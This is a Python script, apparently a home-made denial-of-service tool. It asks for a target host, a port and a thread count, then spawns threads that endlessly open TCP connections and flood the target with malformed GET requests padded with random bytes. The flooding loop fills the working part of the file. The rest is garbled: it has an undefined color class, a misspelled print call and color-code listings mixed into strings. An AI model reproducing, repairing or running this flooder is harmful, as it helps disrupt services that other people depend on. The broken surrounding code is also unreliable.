import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    def warna():
print("""
\033[2mgray = abu-abu
\033[31mred = merah
\033[32mgreen = hijau
\033[33myellow = kuning
\033[34mblue = biru
\033[35mpurple = ungu
\033[36mcyan = cyan
\033[90mdark gray = abu-abu gelap

def warnabg():
Background color
\033[7mwhite = putih
\033[40mblack = hitam
\033[41mred = merah
\033[42mgreen = hijau
\033[43myellow = kuning
\033[44mblue = biru
\033[45mpurple = ungu
\033[46mcyan = cyan
warnabg()

def warnacerah():
\033[91mbright red = merah cerah
\033[92mbright green = hijau cerah
\033[93mbright yellow = kuning cerah
\033[94mbright blue = biru cerah
\033[95mbrightpurple=Ungu cerah
\033[96mbright cyan=cyan cerah
\033[97mbright white=putih cerah

warnacerah()
\033[47mbright gray=abu² cerah
\033[100mdarklightgray=abu-abu gelap
\033[101mbright red=merah cerah
\033[102mbright green=hijau cerah
\033[104mbright blue=biru cerah
\033[105mbright purple=ungu cerah
\033[106mbright cyan=cyan cerah
\033[103mbright yellow=kuning cerah
""")
peint("""
\033[96m║\033[102m
\033[96m║\033[102m║████████╚╗
\033[96m║\033[102m║██╔═══╗██║
\033[96m║\033[102m║██║     ║██║
\033[96m║\033[102m║██║     ║██║
\033[96m║\033[102m║██║     ║██║
\033[96m║\033[102m║██║     ║██║
\033[96m║\033[102m║████████╔╝
\033[96m║\033[102m║██╔══╗██╚╗
\033[96m║\033[102m║██║    ╚╗██║
\033[96m║\033[102m╚══╝      ╚══╝
\033[96m║\033[102m
""")
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
 ____       ____      _____           

        written by:••••
               
      ''')
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD +ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 0;



class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    _   _   _             _      _                                                                 |___/ 
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
